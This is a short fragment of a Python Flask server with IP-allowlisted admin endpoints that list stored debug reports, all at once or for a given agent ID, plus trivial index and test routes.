def list_debug_reports():
    if request.remote_addr not in good_ips:
        abort(404)
    
    reports = db.session.query(DebugReport).order_by(db.desc(DebugReport.timestamp)).all()
    return jsonify([r.json() for r in reports])

@app.route("/admin/api/debug_reports/<agent_id>", methods=["GET"])
def get_agent_debug_reports(agent_id):
    if request.remote_addr not in good_ips:
        abort(404)
    
    reports = db.session.query(DebugReport).filter(DebugReport.agent_id==agent_id).order_by(db.desc(DebugReport.timestamp)).all()
    return jsonify([r.json() for r in reports])
       
# function to render index page
@app.route('/test_json')
def test_json():
    return jsonify({"data":"ok"})
 
# function to render index page
@app.route('/')
def index():
    return "ok"
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
    db.create_all()